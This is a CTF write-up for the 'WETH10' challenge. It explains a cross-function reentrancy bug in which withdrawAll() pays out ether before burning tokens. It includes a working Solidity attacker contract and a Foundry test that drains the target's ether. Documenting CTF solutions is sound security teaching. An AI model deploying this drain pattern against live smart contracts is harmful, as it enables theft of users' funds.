# WETH10 CTF Challenge

## Vulnerability

The `withdrawAll()` function in WETH10 is vulnerable to reentrancy attacks because it does not provide the necessary protection even though it uses a reentrancy guard. The `nonReentrant` modifier is used to prevent the same function from being called again within the same transaction, but other functions like `ERC20._transfer()`, `ERC20.transfer()`, and `ERC20.transferFrom()` which are not protected by the `nonReentrant` modifier can still be used to perform reentrant attacks.

Here is the vulnerable function:

    function withdrawAll() external nonReentrant {
        Address.sendValue(payable(msg.sender), balanceOf(msg.sender));
        _burnAll();
    }

This function performs an external call, which can be used by an attacker contract to transfer tokens from their wallet before `_burnAll()` is called.

## Attacker steps

The attacker deploys a contract with an exploit() function which:

1. Calls `WETH10.deposit()` to deposit 1 ether
2. Calls `WETH10.withdrawAll()` to withdraw 1 ether
3. Sends ether to the attacker contract to trigger the `fallback()` function which transfers all WETH10 tokens in the contract to an external address owned by the attacker.
4. After the `fallback()` function returns, `WETH10._burnAll()` is called, which burns the token balance inside the attacker contract, but since all tokens have been transferred out, it burns none of them.
5. The attacker pulls back the tokens from the attacker contract.
6. The attacker repeats steps 2 to 5 until all tokens are drained.

## POC

### Attacker.sol

    pragma solidity ^0.8.0;

    import "./weth10.sol";

    contract Attacker {
        WETH10 public target;
        address public bob;

        constructor(address payable _target, address payable _bob) {
            target = WETH10(_target);
            bob = _bob;
        }

        fallback() external payable {
            target.transfer(bob, 1 ether);
        }

        function deposit(uint256 amount) public payable {
            target.deposit{value: (amount)}();
        }

        function withdrawAll() public {
            payable(msg.sender).transfer(address(this).balance);
        }

        function attack(uint256 amount) public {
            target.withdrawAll();
            target.transferFrom(bob, address(this), amount);
        }

        function exploit() external payable {
            deposit(1 ether);
            while ((address(target).balance) > 1 wei) {
                attack(1 ether);
            }
            withdrawAll();
        }
    }

### weth10.t.sol

    pragma solidity ^0.8.0;

    import "forge-std/Test.sol";
    import "../src/Counter.sol";
    import "../src/weth10.sol";
    import "../src/Attacker.sol";

    contract Weth10Test is Test {
        WETH10 public weth;
        Attacker public attacker;
        address owner;
        address bob;

        function setUp() public {
            weth = new WETH10();
            bob = makeAddr("bob");
            attacker = new Attacker(payable(address(weth)), payable(bob));

            vm.deal(address(weth), 10 ether);
            vm.deal(address(bob), 1 ether);
        }

        function testHack() public {
            assertEq(
                address(weth).balance,
                10 ether,
                "weth contract should have 10 ether"
            );

            vm.startPrank(bob);

            // hack time!
            weth.approve(address(attacker), 11 ether);
            attacker.exploit{value:1 ether}();

            vm.stopPrank();
                console.logUint(address(weth).balance);
                assertEq(address(weth).balance, 0, "empty weth contract");
                assertEq(bob.balance, 11 ether, "player should end with 11 ether");
            }
        }
